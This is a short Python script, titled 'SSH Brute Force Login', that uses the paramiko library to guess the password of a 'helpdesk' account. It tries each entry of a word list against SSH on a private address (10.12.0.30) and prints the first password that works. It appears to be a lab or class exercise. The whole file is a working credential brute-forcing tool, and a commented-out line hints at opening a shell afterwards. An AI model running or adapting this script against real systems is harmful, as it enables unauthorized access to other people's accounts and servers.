#SSH Brute Force Login
#Mackenzie Summers
#Run from Win10

import paramiko
 
def connect(password):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		client.connect("10.12.0.30", username="helpdesk", password=password, timeout=1)
	except:
		client.close()
		return False
	client.close()
	return True
 
def ssh_brute():
	final_pass = ""
	f = open("passlist.txt")
	pass_list = f.readlines()
	f.close()
	for password in pass_list:
		password = password.strip()
		check = connect(password)
		if check == True:
			final_pass = password
			break
	print("\nPassword Found: {}".format(final_pass))
		#conn = client.invoke_shell()
print("\nSSH Brute Force\n")
print("This may take some time")
ssh_brute()

